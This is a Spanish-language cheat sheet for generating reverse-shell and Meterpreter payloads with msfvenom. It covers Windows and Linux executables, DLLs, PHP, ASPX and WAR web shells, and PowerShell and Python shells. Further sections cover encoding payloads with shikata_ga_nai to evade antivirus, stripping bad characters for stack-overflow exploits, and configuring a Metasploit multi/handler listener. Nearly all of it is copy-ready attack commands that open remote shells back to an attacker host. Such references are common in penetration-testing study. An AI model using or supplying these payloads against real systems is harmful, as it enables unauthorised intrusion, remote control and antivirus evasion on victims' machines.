# Msfvenom & Metasploit Cheat Sheet
> **Guía rápida de comandos para la generación de payloads reversos y directos (bind) con Msfvenom, evasión mediante codificadores y configuración de escuchas en Metasploit.**

---

## 🚀 Sintaxis Básica de Msfvenom

```bash
msfvenom -p <PAYLOAD> LHOST=<TU_IP> LPORT=<TU_PUERTO> -f <FORMATO> -o <SALIDA>
```
* **Listar opciones**:
  * Listar todos los payloads: `msfvenom -l payloads`
  * Listar formatos de salida: `msfvenom -l formats`
  * Listar codificadores (encoders): `msfvenom -l encoders`

---

## 💻 Payloads Comunes por Plataforma

### 🪟 1. Windows

* **Ejecutable Reverso TCP (x64)**:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe
  ```
* **Librería Dinámica Reversa (.dll - x64)**:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f dll -o shell.dll
  ```
* **Payload para Meterpreter (Conexión cifrada a Metasploit)**:
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o meterpreter.exe
  ```

### 🐧 2. Linux

* **Ejecutable Reverso TCP (x64)**:
  ```bash
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o shell.elf
  ```
* **Payload para Meterpreter (x64)**:
  ```bash
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o meter_shell.elf
  ```

### 🕸️ 3. Aplicaciones Web

* **Script PHP Reverso**:
  ```bash
  msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
  ```
* **Script ASPX Reverso (Servidores IIS / ASP.NET)**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f aspx -o shell.aspx
  ```
* **Archivo WAR Reverso (Servidores Tomcat / Java)**:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f war -o shell.war
  ```

### 🐍 4. Lenguajes de Scripting y One-Liners

* **PowerShell**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f ps1 -o shell.ps1
  ```
* **Python**:
  ```bash
  msfvenom -p cmd/unix/reverse_python LHOST=<TU_IP> LPORT=4444 -f raw -o shell.py
  ```

---

## 🛡️ Evasión de Antivirus y Codificación

* **Codificar el payload (ej. usando Shikata Ga Nai para evadir firmas simples)**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
  ```
  *(La opción `-i 5` aplica el codificador 5 veces consecutivas)*.
* **Omitir caracteres nulos (Bad Characters - crucial para exploits de desbordamiento de pila)**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -b '\x00\x0a\x0d' -f python
  ```

---

## 🎧 Configuración de Escuchas en Metasploit (`multi/handler`)

Cuando usas un payload diseñado para Metasploit (como `meterpreter`), debes usar el receptor correspondiente en la consola de MSF.

1. **Iniciar Metasploit**:
   ```bash
   msfconsole -q
   ```
2. **Cargar el módulo handler**:
   ```text
   msf6 » use exploit/multi/handler
   ```
3. **Definir el payload (Debe coincidir exactamente con el de msfvenom)**:
   ```text
   msf6 exploit(multi/handler) » set payload windows/x64/meterpreter/reverse_tcp
   ```
4. **Configurar las variables de red**:
   ```text
   msf6 exploit(multi/handler) » set LHOST <TU_IP>
   msf6 exploit(multi/handler) » set LPORT 4444
   ```
5. **Ejecutar en segundo plano**:
   ```text
   msf6 exploit(multi/handler) » run -j
   ```
